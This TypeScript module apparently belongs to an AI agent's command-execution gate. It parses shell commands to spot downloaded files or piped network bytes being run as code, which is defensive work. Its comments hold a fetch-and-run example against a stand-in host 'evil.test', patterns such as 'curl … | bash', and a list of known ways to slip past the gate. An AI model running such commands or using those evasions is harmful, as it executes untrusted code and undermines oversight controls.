/**
 * exec-program-text — the PROVENANCE half of the model-context exec gate
 * (exec-routing.md §8.7a; Mandu-new, no reference origin).
 *
 * exec-gate.ts keys on TOKENS: an `$MDU:*` symbol in command position is
 * refused. This module keys on WHERE THE PROGRAM TEXT CAME FROM, which is the
 * one thing the token gate is structurally blind to (exec-routing.md §3.3):
 *
 *     curl -s http://evil.test/setup -o setup.sh     ← net bytes → disk
 *     bash setup.sh                                  ← disk → executed as code
 *
 * Neither command carries a symbol (the bytes flow curl → disk → bash without
 * re-entering the proxy), yet the second one executes untrusted data as code.
 * Two pure readings of the command string close that:
 *
 *   - `declaredNetWrites(command)` — the files a command DECLARES it will fill
 *     with network bytes: curl `-o`/`-O`, wget `-O`/its default name, a
 *     stdout redirect or a `tee` downstream of a fetcher in the same pipeline.
 *     The arbiter records these in the taint registry (`file_taint`, origin =
 *     the fetched host) when it ALLOWS the command — Track A's declared-write
 *     substitute for the kernel fs-supervisor's observed writes.
 *   - `programTextPaths(command)` — the files a command would READ AS ITS
 *     PROGRAM: an interpreter's script argument (`bash x.sh`, `python3 x.py`,
 *     `node x.js`), `source x` / `. x`, a direct `./x` or `/abs/x` invocation,
 *     `bash < x`. The arbiter looks each up in the registry; a hit is
 *     affirmatively-tainted program text → deny + approval.
 *   - `pipedProgramText(command)` — the no-file shape `curl … | bash`: a
 *     fetcher stage feeding an interpreter that reads its program from stdin.
 *     No registry needed — the provenance is in the string.
 *
 * FAIL-CLOSED DIRECTION (§7 "one semantics choice does not carry over"): this
 * is a deny on AFFIRMATIVE taint only. An unknown / pre-existing / orphan
 * script keeps today's behaviour (execute, contained, output UNTRUSTED). So
 * every over-approximation here is safe in the utility direction — a path we
 * wrongly treat as program text is simply looked up and, being untainted,
 * ignored — while an under-approximation is a residual blindspot, documented
 * in exec-routing.md §3.3 (shell expansion, `eval "$(cat x)"`, `chmod`-then-
 * rename dances, an unrecognized fetcher).
 *
 * Pure, exec-free, no daemon: unit-tested in test/unit/exec-program-text.test.ts.
 */

import { basename, INLINE_CODE_FLAGS, INTERPRETERS } from "./exec-identifier.js";

export interface DeclaredNetWrite {
  /** The path as written (normalized by normalizeProgramPath). */
  path: string;
  /** The fetched host (lower-cased, port stripped). */
  originHost: string;
}

export interface PipedProgramText {
  /** The fetched host feeding the interpreter's stdin. */
  originHost: string;
  /** The interpreter basename that reads its program from the pipe. */
  interpreter: string;
}

/** Programs whose job is to pull bytes off the network onto disk/stdout. */
const NET_FETCHERS: ReadonlySet<string> = new Set(["curl", "wget"]);

/** Command-word prefixes that shift the real command rightward. */
const COMMAND_PREFIXES: ReadonlySet<string> = new Set([
  "env", "exec", "nohup", "time", "command", "builtin", "sudo", "nice", "stdbuf",
]);

/** Interpreters that take a SCRIPT FILE as their first non-flag argument (the
 * package runners — npx/bunx/yarn/pnpm — take package names, not files). */
const SCRIPT_INTERPRETERS: ReadonlySet<string> = new Set(
  [...INTERPRETERS].filter((i) => !["npx", "bunx", "yarn", "pnpm"].includes(i)),
);

/** curl options that CONSUME the next token (so it is not mistaken for a URL). */
const CURL_ARG_FLAGS: ReadonlySet<string> = new Set([
  "-H", "--header", "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
  "-X", "--request", "-u", "--user", "-A", "--user-agent", "-e", "--referer",
  "-b", "--cookie", "-c", "--cookie-jar", "-F", "--form", "-T", "--upload-file",
  "-m", "--max-time", "--connect-timeout", "--retry", "--retry-delay", "-w", "--write-out",
  "-K", "--config", "-x", "--proxy", "--cacert", "--cert", "--key", "-E",
  "--output-dir", "-r", "--range", "--limit-rate", "--resolve", "--interface",
  "--dns-servers", "--max-redirs", "--max-filesize", "-Q", "--quote", "--stderr",
  "--trace", "--trace-ascii", "-D", "--dump-header", "--url", "--unix-socket",
  "--abstract-unix-socket", "-Y", "--speed-limit", "-y", "--speed-time", "--oauth2-bearer",
  "--tls-max", "--tlsuser", "--tlspassword", "--proto", "--proto-redir", "--proxy-user",
  "-U", "--socks5", "--socks4", "--socks4a", "--noproxy", "--local-port", "--ciphers",
  "--curves", "--pinnedpubkey", "--egd-file", "--engine", "--hostpubmd5", "--hostpubsha256",
  "--pubkey", "--krb", "--delegation", "--login-options", "--mail-from", "--mail-rcpt",
  "--mail-auth", "--tftp-blksize", "--ftp-account", "--ftp-alternative-to-user",
  "--ftp-port", "-P", "--variable", "--expand-url",
]);

/** wget options that CONSUME the next token. Note `-o` is wget's LOG file. */
const WGET_ARG_FLAGS: ReadonlySet<string> = new Set([
  "-o", "--output-file", "-a", "--append-output", "-e", "--execute", "-i", "--input-file",
  "-B", "--base", "-t", "--tries", "-T", "--timeout", "--dns-timeout", "--connect-timeout",
  "--read-timeout", "-w", "--wait", "--waitretry", "--random-wait", "--limit-rate",
  "-Q", "--quota", "--bind-address", "-U", "--user-agent", "--header", "--referer",
  "--post-data", "--post-file", "--method", "--body-data", "--body-file",
  "--http-user", "--http-password", "--user", "--password", "--ask-password",
  "--proxy-user", "--proxy-password", "--load-cookies", "--save-cookies",
  "--ca-certificate", "--ca-directory", "--certificate", "--private-key",
  "--certificate-type", "--private-key-type", "--secure-protocol", "--https-only",
  "-l", "--level", "-A", "--accept", "-R", "--reject", "-D", "--domains",
  "--exclude-domains", "-I", "--include-directories", "-X", "--exclude-directories",
  "--cut-dirs", "--warc-file", "--warc-header", "--warc-max-size", "--warc-tempdir",
  "--regex-type", "--accept-regex", "--reject-regex", "--rejected-log", "--start-pos",
  "--prefer-family", "--local-encoding", "--remote-encoding", "--unlink", "--ftp-user",
  "--ftp-password", "--restrict-file-names", "-nc", "--progress", "--report-speed",
]);

/** A token that looks like a URL curl/wget would fetch. With a scheme, any
 * host. Schemeless (both fetchers accept `host/path`), only a shape a bare
 * FILENAME cannot take — `localhost[:port]`, an IPv4, `www.…`, or a dotted host
 * FOLLOWED by a `/path` or `:port` — so `setup.sh` is never read as a host. A
 * schemeless `curl example.test` (no path) is the accepted residual. */
const URL_SCHEME_RE = /^[a-z][a-z0-9+.-]*:\/\/(?:[^\s@/]+@)?[^\s/?#]+/i;
const URL_BARE_RE = /^(?:[^\s@/]+@)?(?:localhost(?::\d+)?(?:[/?#]|$)|(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:[/?#]|$)|www\.[a-z0-9-]+(?:\.[a-z0-9-]+)+(?::\d+)?(?:[/?#]|$)|[a-z0-9-]+(?:\.[a-z0-9-]+)+(?::\d+(?:[/?#]|$)|[/?#]))/i;

/** The host of a URL-looking token (lower-cased, userinfo + port stripped), or null. */
export function urlHost(token: string): string | null {
  if (!URL_SCHEME_RE.test(token) && !URL_BARE_RE.test(token)) return null;
  let rest = token.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
  const at = rest.indexOf("@");
  const firstSlash = rest.search(/[/?#]/);
  if (at >= 0 && (firstSlash < 0 || at < firstSlash)) rest = rest.slice(at + 1);
  const end = rest.search(/[/?#]/);
  const authority = end >= 0 ? rest.slice(0, end) : rest;
  const host = authority.replace(/:\d+$/, "").toLowerCase();
  return host.length > 0 ? host : null;
}

/** The last path segment of a URL (what `curl -O` / wget's default name use),
 * query/fragment stripped; "" when the URL has no file component. */
function urlBasename(token: string): string {
  const noScheme = token.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
  const path = noScheme.replace(/[?#].*$/, "");
  const slash = path.indexOf("/");
  if (slash < 0) return "";
  return basename(path.slice(slash + 1));
}

/**
 * Normalize a program/output path for registry matching: leading `./`
 * stripped (repeatedly), duplicate slashes collapsed, `.` and `..` segments
 * resolved TEXTUALLY (no filesystem access; a leading `/` or `~` is kept).
 * `curl -o ./setup.sh` and `bash setup.sh` must meet on one key.
 */
export function normalizeProgramPath(path: string): string {
  let p = path.trim();
  if (p === "") return "";
  const absolute = p.startsWith("/");
  const segments = p.split("/").filter((s) => s !== "" && s !== ".");
  const out: string[] = [];
  for (const s of segments) {
    if (s === ".." && out.length > 0 && out[out.length - 1] !== "..") out.pop();
    else if (s === ".." && absolute) continue; // `/..` stays at the root
    else out.push(s);
  }
  const joined = out.join("/");
  if (absolute) return "/" + joined;
  return joined === "" ? "." : joined;
}

// ── lexer ────────────────────────────────────────────────────────────────────

type Tok =
  | { kind: "word"; text: string }
  | { kind: "op"; text: string };

/**
 * Quote-aware shell lexer that ALSO emits the control/redirect operators as
 * their own tokens (exec-identifier's `tokenize` folds `a&&b` into one word —
 * fine for identity, blind for this gate). Words keep their quoted contents
 * unescaped; `$(...)`, backticks and heredocs are not interpreted (a program
 * text hidden in a command substitution is a documented residual).
 */
function lex(command: string): Tok[] {
  const toks: Tok[] = [];
  let cur = "";
  let inWord = false;
  const flush = (): void => {
    if (inWord) toks.push({ kind: "word", text: cur });
    cur = "";
    inWord = false;
  };
  const n = command.length;
  let i = 0;
  while (i < n) {
    const c = command[i]!;
    if (c === " " || c === "\t" || c === "\n" || c === "\r") { flush(); i++; continue; }
    if (c === '"') {
      inWord = true; i++;
      while (i < n && command[i] !== '"') {
        if (command[i] === "\\" && i + 1 < n) { cur += command[i + 1]; i += 2; }
        else { cur += command[i]; i++; }
      }
      if (i < n) i++;
      continue;
    }
    if (c === "'") {
      inWord = true; i++;
      while (i < n && command[i] !== "'") { cur += command[i]; i++; }
      if (i < n) i++;
      continue;
    }
    if (c === "\\" && i + 1 < n) { cur += command[i + 1]; inWord = true; i += 2; continue; }
    // Command / process substitution: `$(…)`, `<(…)`, `>(…)` — kept INSIDE the
    // word (paren-depth matched) so a `|` or `<` within it never splits a
    // stage; the readers below scan words for these shapes.
    if ((c === "$" || c === "<" || c === ">") && command[i + 1] === "(") {
      let depth = 0;
      inWord = true;
      while (i < n) {
        const d = command[i]!;
        cur += d;
        if (d === "(") depth++;
        else if (d === ")") { depth--; if (depth === 0) { i++; break; } }
        i++;
      }
      continue;
    }
    if (c === "`") {
      inWord = true; cur += c; i++;
      while (i < n && command[i] !== "`") { cur += command[i]; i++; }
      if (i < n) { cur += "`"; i++; }
      continue;
    }
    if (c === "&" && command[i + 1] === "&") { flush(); toks.push({ kind: "op", text: "&&" }); i += 2; continue; }
    if (c === "|" && command[i + 1] === "|") { flush(); toks.push({ kind: "op", text: "||" }); i += 2; continue; }
    if (c === "|" || c === ";") { flush(); toks.push({ kind: "op", text: c }); i++; continue; }
    if (c === "&" && command[i + 1] === ">") {
      // `&>file` / `&>>file`: both streams to a file.
      flush();
      const op = command[i + 2] === ">" ? "&>>" : "&>";
      toks.push({ kind: "op", text: op }); i += op.length; continue;
    }
    if (c === "&") { flush(); toks.push({ kind: "op", text: "&" }); i++; continue; }
    if (c === ">" || c === "<") {
      // An fd prefix (`2>`, `1>>`) is part of the operator, not a word.
      let fd = "";
      if (inWord && /^\d+$/.test(cur)) { fd = cur; cur = ""; inWord = false; }
      flush();
      let op = c;
      i++;
      if (command[i] === c) { op += c; i++; }           // >> or <<
      if (c === "<" && command[i] === "<") { op += "<"; i++; } // <<< herestring
      if (command[i] === "&") { op += "&"; i++; }        // >& / <& (fd dup) / >>&
      if (command[i] === "|") { op += "|"; i++; }        // >| (noclobber override)
      toks.push({ kind: "op", text: fd + op });
      continue;
    }
    cur += c; inWord = true; i++;
  }
  flush();
  return toks;
}

/** One pipeline stage: its argv words plus the file targets of its redirects. */
interface Stage {
  argv: string[];
  /** Files written by `>`/`>>`/`&>`/`n>` redirects on this stage. */
  writes: string[];
  /** Files read by `<` redirects on this stage. */
  reads: string[];
}

/** Split a lexed command into pipelines (control operators) of stages (`|`). */
function pipelines(command: string): Stage[][] {
  const out: Stage[][] = [];
  let pipeline: Stage[] = [];
  let stage: Stage = { argv: [], writes: [], reads: [] };
  const toks = lex(command);
  const endStage = (): void => {
    if (stage.argv.length > 0 || stage.writes.length > 0 || stage.reads.length > 0) pipeline.push(stage);
    stage = { argv: [], writes: [], reads: [] };
  };
  const endPipeline = (): void => {
    endStage();
    if (pipeline.length > 0) out.push(pipeline);
    pipeline = [];
  };
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i]!;
    if (t.kind === "word") { stage.argv.push(t.text); continue; }
    if (t.text === "|") { endStage(); continue; }
    if (t.text === "&&" || t.text === "||" || t.text === ";" || t.text === "&") { endPipeline(); continue; }
    // A redirect operator: its target is the next word (if any).
    const next = toks[i + 1];
    const target = next && next.kind === "word" ? next.text : undefined;
    const op = t.text.replace(/^\d+/, "");
    if (op === "<<" || op === "<<<") { if (target) i++; continue; } // heredoc/herestring: not a file
    if (op === ">&" || op === "<&" || op === ">>&") {
      // fd dup (`2>&1`) when the target is a digit or `-`; else bash treats
      // `>&file` as `&>file`.
      if (target !== undefined && /^(\d+|-)$/.test(target)) { i++; continue; }
      if (target !== undefined) { stage.writes.push(target); i++; }
      continue;
    }
    if (op.startsWith(">") || op === "&>" || op === "&>>") { if (target !== undefined) { stage.writes.push(target); i++; } continue; }
    if (op.startsWith("<")) { if (target !== undefined) { stage.reads.push(target); i++; } continue; }
  }
  endPipeline();
  return out;
}

/** The command word of a stage after `VAR=`/env/sudo-style prefixes, and its
 * remaining args. `null` for an empty stage (a bare redirect). */
function commandOf(stage: Stage): { word: string; args: string[] } | null {
  const argv = stage.argv;
  let i = 0;
  while (i < argv.length) {
    const w = argv[i]!;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) { i++; continue; }
    const b = basename(w);
    if (COMMAND_PREFIXES.has(b)) {
      i++;
      // A prefix's own short flags (`sudo -u root`, `nice -n 10`, `stdbuf -oL`).
      while (i < argv.length && argv[i]!.startsWith("-")) {
        const f = argv[i]!;
        i++;
        if ((b === "sudo" && /^-[ugpCDhrt]$/.test(f)) || (b === "nice" && f === "-n") || (b === "env" && f === "-u")) i++;
      }
      continue;
    }
    return { word: w, args: argv.slice(i + 1) };
  }
  return null;
}

/** A fetcher stage's declared outputs + fetched host. */
function fetcherOf(stage: Stage): { host: string | null; outputs: string[]; toStdout: boolean } | null {
  const cmd = commandOf(stage);
  if (!cmd) return null;
  const tool = basename(cmd.word);
  if (!NET_FETCHERS.has(tool)) return null;
  const outputs: string[] = [];
  let host: string | null = null;
  let firstUrl: string | null = null;
  let remoteName = false;
  let explicitOutput = false;
  let stdoutOutput = false;
  let prefixDir: string | null = null;
  const args = cmd.args;
  const argFlags = tool === "curl" ? CURL_ARG_FLAGS : WGET_ARG_FLAGS;
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (a === "--") { for (const u of args.slice(i + 1)) if (!firstUrl && urlHost(u)) firstUrl = u; break; }
    if (tool === "curl") {
      if (a === "-o" || a === "--output") { const p = args[++i]; if (p !== undefined) { outputs.push(p); explicitOutput = true; } continue; }
      if (a.startsWith("--output=")) { outputs.push(a.slice("--output=".length)); explicitOutput = true; continue; }
      if (a === "-O" || a === "--remote-name" || a === "--remote-name-all") { remoteName = true; continue; }
      // Bundled short flags: `-so FILE`, `-sofile`, `-sLO`. Letters before the
      // `o`/`O` are taken as arg-less switches (the common -s/-S/-L/-f/-k set).
      const bo = !a.startsWith("--") ? /^-([A-Za-z]*)o(.*)$/.exec(a) : null;
      if (bo && !/[oO]/.test(bo[1]!)) {
        const rest = bo[2]!;
        if (rest !== "") outputs.push(rest); else { const p = args[++i]; if (p !== undefined) outputs.push(p); }
        explicitOutput = true; continue;
      }
      if (!a.startsWith("--") && /^-[A-Za-z]*O[A-Za-z]*$/.test(a)) { remoteName = true; continue; }
      if (a === "--url") { const u = args[++i]; if (u !== undefined && !firstUrl && urlHost(u)) firstUrl = u; continue; }
      if (a.startsWith("--url=")) { const u = a.slice(6); if (!firstUrl && urlHost(u)) firstUrl = u; continue; }
    } else {
      if (a === "-O" || a === "--output-document") { const p = args[++i]; if (p !== undefined) { if (p === "-") stdoutOutput = true; else outputs.push(p); explicitOutput = true; } continue; }
      if (a.startsWith("--output-document=")) { const p = a.slice("--output-document=".length); if (p === "-") stdoutOutput = true; else outputs.push(p); explicitOutput = true; continue; }
      // Bundled short flags: `-qO FILE`, `-qO-`, `-O-`.
      const bO = !a.startsWith("--") ? /^-([A-Za-z]*)O(.*)$/.exec(a) : null;
      if (bO && !/O/.test(bO[1]!)) {
        const rest = bO[2]!;
        const p = rest !== "" ? rest : args[++i];
        if (p !== undefined) { if (p === "-") stdoutOutput = true; else outputs.push(p); }
        explicitOutput = true; continue;
      }
      if (a === "-P" || a === "--directory-prefix") { prefixDir = args[++i] ?? null; continue; }
      if (a.startsWith("--directory-prefix=")) { prefixDir = a.slice("--directory-prefix=".length); continue; }
    }
    if (argFlags.has(a)) { i++; continue; }
    if (a.startsWith("-")) continue;
    if (!firstUrl && urlHost(a)) firstUrl = a;
  }
  if (firstUrl) host = urlHost(firstUrl);
  if (tool === "curl" && remoteName && firstUrl) {
    const b = urlBasename(firstUrl);
    if (b) outputs.push(b);
  }
  if (tool === "wget" && !explicitOutput && firstUrl) {
    const b = urlBasename(firstUrl) || "index.html";
    outputs.push(prefixDir ? `${prefixDir}/${b}` : b);
  }
  // curl writes to stdout unless told otherwise; wget only with `-O -`.
  const toStdout = tool === "curl" ? outputs.length === 0 : stdoutOutput;
  return { host, outputs, toStdout };
}

/** The script file an interpreter stage would read as its program, or null
 * (inline code, a module, stdin, or not an interpreter). `stdin: true` when
 * the interpreter reads its program from the pipe / a `<` redirect. */
function interpreterProgramOf(stage: Stage): { file: string | null; stdin: boolean; interpreter: string } | null {
  const cmd = commandOf(stage);
  if (!cmd) return null;
  const interp = basename(cmd.word);
  if (!SCRIPT_INTERPRETERS.has(interp)) return null;
  const args = cmd.args;
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (INLINE_CODE_FLAGS.has(a)) return { file: null, stdin: false, interpreter: interp };
    if (a === "-m" && /^python/.test(interp)) return { file: null, stdin: false, interpreter: interp };
    if (a === "-") return { file: null, stdin: true, interpreter: interp };
    if (a === "-s" && (interp === "sh" || interp === "bash" || interp === "zsh" || interp === "dash")) {
      return { file: null, stdin: true, interpreter: interp }; // `sh -s -- args`: program from stdin
    }
    if (a === "--") { const f = args[i + 1]; return { file: f ?? null, stdin: f === undefined, interpreter: interp }; }
    if (interp === "deno" && (a === "run" || a === "eval")) { if (a === "eval") return { file: null, stdin: false, interpreter: interp }; continue; }
    if (a.startsWith("-")) continue;
    // `bash <(curl …)`: the program is whatever the substitution produces —
    // read like stdin (the substitution readers attribute it).
    if (a.startsWith("<(")) return { file: null, stdin: true, interpreter: interp };
    return { file: a, stdin: false, interpreter: interp };
  }
  // No file argument: a `<` redirect feeds the program, else the pipe/tty does.
  const redirected = stage.reads[0];
  if (redirected !== undefined) {
    if (redirected.startsWith("<(") || redirected.startsWith("(")) return { file: null, stdin: true, interpreter: interp };
    return { file: redirected, stdin: false, interpreter: interp };
  }
  return { file: null, stdin: true, interpreter: interp };
}

/** Whether a stage EVALUATES text it did not get as a file: `eval`, an
 * interpreter with inline code (`bash -c "…"`), `source`/`.`, or an
 * interpreter reading stdin. These are where a `$(cat x)` / `$(curl …)` /
 * `<(curl …)` substitution in the stage's own words becomes program text. */
function evaluatesSubstitutions(stage: Stage): { interpreter: string } | null {
  const cmd = commandOf(stage);
  if (!cmd) return null;
  const b = basename(cmd.word);
  if (b === "eval" || b === "source" || cmd.word === ".") return { interpreter: b === "." ? "source" : b };
  const interp = interpreterProgramOf(stage);
  if (!interp) return null;
  if (interp.stdin) return { interpreter: interp.interpreter };
  if (cmd.args.some((a) => INLINE_CODE_FLAGS.has(a))) return { interpreter: interp.interpreter };
  return null;
}

/** Substitutions inside a word that READ a file or FETCH a host into program
 * text: `$(cat F)`, `$(<F)`, `` `cat F` ``, `<(cat F)`, `$(curl … URL)`,
 * `<(wget … URL)`. Returns the files and hosts found. */
function substitutionSources(word: string): { files: string[]; hosts: string[] } {
  const files: string[] = [];
  const hosts: string[] = [];
  const inner = /(?:\$\(|<\(|`)\s*([^)`]*?)\s*(?:\)|`)/g;
  let m: RegExpExecArray | null;
  while ((m = inner.exec(word)) !== null) {
    const body = m[1]!;
    const bodyToks = lex(body).filter((t) => t.kind === "word").map((t) => t.text);
    if (bodyToks.length === 0) continue;
    // `$(<file)` — the lexer turns `<file` into a redirect op + word; re-read it.
    const lt = /^\s*<\s*(\S+)/.exec(body);
    if (lt) { files.push(lt[1]!); continue; }
    const head = basename(bodyToks[0]!);
    if (NET_FETCHERS.has(head)) {
      const f = fetcherOf({ argv: bodyToks, writes: [], reads: [] });
      if (f?.host) hosts.push(f.host);
      continue;
    }
    // A reader (cat/head/tail/sed/awk/…): every non-flag arg is a candidate file
    // (over-approximation is safe — only tainted paths matter).
    for (const a of bodyToks.slice(1)) if (!a.startsWith("-")) files.push(a);
  }
  return { files, hosts };
}

export interface StdinProgram {
  /** The evaluating interpreter (`bash`, `sh`, `python3`, `eval`, `source`). */
  interpreter: string;
  /** Hosts whose fetched bytes reach the program text (pipe or substitution). */
  originHosts: string[];
  /** Files whose bytes reach the program text (an upstream `cat F | bash`, a
   * `$(cat F)` substitution, `bash -c "$(<F)"`) — looked up in the registry. */
  sourceFiles: string[];
}

/**
 * Programs whose text is NOT a file argument: an interpreter reading stdin
 * downstream of other stages (`curl … | bash`, `cat x | sh`), `eval`/inline
 * code/`source` over a substitution (`bash -c "$(cat x)"`, `eval "$(curl …)"`,
 * `bash <(curl …)`). Reports where the bytes come from — hosts (provenance in
 * the string) and files (provenance in the registry). Over-approximates the
 * upstream stages' args as files: only a TAINTED path ever matters.
 */
export function stdinPrograms(command: string): StdinProgram[] {
  const out: StdinProgram[] = [];
  for (const pipeline of pipelines(command)) {
    // What flows down the pipe so far: hosts fetched + files read by stages
    // before the current one (all non-flag args + `<` reads).
    const upHosts: string[] = [];
    const upFiles: string[] = [];
    for (const stage of pipeline) {
      const evaluating = evaluatesSubstitutions(stage);
      if (evaluating) {
        const hosts = new Set<string>();
        const files = new Set<string>();
        const interp = interpreterProgramOf(stage);
        const readsStdin = interp?.stdin === true;
        if (readsStdin) { for (const h of upHosts) hosts.add(h); for (const f of upFiles) files.add(f); }
        for (const w of stage.argv) {
          const sub = substitutionSources(w);
          for (const h of sub.hosts) hosts.add(h);
          for (const f of sub.files) files.add(f);
        }
        if (hosts.size > 0 || files.size > 0) {
          out.push({ interpreter: evaluating.interpreter, originHosts: [...hosts], sourceFiles: [...files].map(normalizeProgramPath).filter((f) => f !== "" && f !== "." && f !== "-") });
        }
      }
      // Accumulate this stage's contribution for the stages after it.
      const fetcher = fetcherOf(stage);
      if (fetcher) {
        if (fetcher.host && fetcher.toStdout) upHosts.push(fetcher.host);
      } else {
        const cmd = commandOf(stage);
        if (cmd) for (const a of cmd.args) if (!a.startsWith("-")) upFiles.push(a);
        for (const r of stage.reads) upFiles.push(r);
        for (const w of stage.argv) { const sub = substitutionSources(w); upHosts.push(...sub.hosts); upFiles.push(...sub.files); }
      }
    }
  }
  return out;
}

// ── the three readings ───────────────────────────────────────────────────────

/**
 * The files this command DECLARES it will fill with network bytes, each with
 * the host the bytes come from. A fetcher whose host cannot be read off the
 * string (a `-K config`, a `$URL` variable) declares nothing — there is no
 * attributable origin to record. Order = left to right; de-duplicated by path.
 */
export function declaredNetWrites(command: string): DeclaredNetWrite[] {
  const out: DeclaredNetWrite[] = [];
  const seen = new Set<string>();
  const push = (path: string, originHost: string): void => {
    const p = normalizeProgramPath(path);
    if (p === "" || p === "." || p === "/dev/null" || p === "-" || seen.has(p)) return;
    seen.add(p);
    out.push({ path: p, originHost });
  };
  for (const pipeline of pipelines(command)) {
    let flowingHost: string | null = null; // net bytes on the pipe from an upstream stage
    for (const stage of pipeline) {
      const fetcher = fetcherOf(stage);
      if (fetcher) {
        if (fetcher.host) {
          for (const p of fetcher.outputs) push(p, fetcher.host);
          for (const p of stage.writes) push(p, fetcher.host);
          flowingHost = fetcher.toStdout ? fetcher.host : null;
        } else {
          flowingHost = null;
        }
        continue;
      }
      if (flowingHost) {
        const cmd = commandOf(stage);
        // `tee` writes every non-flag arg; any stage's redirect writes the pipe's bytes.
        if (cmd && basename(cmd.word) === "tee") {
          for (const a of cmd.args) if (!a.startsWith("-")) push(a, flowingHost);
        }
        for (const p of stage.writes) push(p, flowingHost);
        // The bytes keep flowing through filters (`sed`, `tr`, `head` …); a
        // stage that consumes them (no stdout of interest) is not modelled —
        // over-approximating "still flowing" only ever ADDS a declared write.
      }
    }
  }
  return out;
}

/**
 * The files this command would read AS ITS PROGRAM TEXT: an interpreter's
 * script argument, `source`/`.` targets, a direct `./x` / `/abs/x` invocation,
 * an interpreter fed by `< file`. Normalized; de-duplicated; left to right.
 */
export function programTextPaths(command: string): string[] {
  const out: string[] = [];
  const seen = new Set<string>();
  const push = (path: string): void => {
    const p = normalizeProgramPath(path);
    if (p === "" || p === "." || p === "-" || seen.has(p)) return;
    seen.add(p);
    out.push(p);
  };
  for (const pipeline of pipelines(command)) {
    for (const stage of pipeline) {
      const cmd = commandOf(stage);
      if (!cmd) continue;
      const word = cmd.word;
      const b = basename(word);
      if (b === "source" || word === ".") {
        const f = cmd.args.find((a) => !a.startsWith("-"));
        if (f !== undefined) push(f);
        continue;
      }
      const interp = interpreterProgramOf(stage);
      if (interp) {
        if (interp.file) push(interp.file);
        continue;
      }
      // Direct execution: a command word with a path component IS the program.
      if (word.includes("/")) push(word);
    }
  }
  return out;
}

/**
 * The `curl … | bash` shape as a host-only projection of {@link stdinPrograms}
 * (provenance in the string — no registry lookup): one entry per (host,
 * interpreter) pair whose fetched bytes reach an evaluating interpreter.
 */
export function pipedProgramText(command: string): PipedProgramText[] {
  const out: PipedProgramText[] = [];
  const seen = new Set<string>();
  for (const sp of stdinPrograms(command)) {
    for (const originHost of sp.originHosts) {
      const key = `${originHost}\u0000${sp.interpreter}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push({ originHost, interpreter: sp.interpreter });
    }
  }
  return out;
}
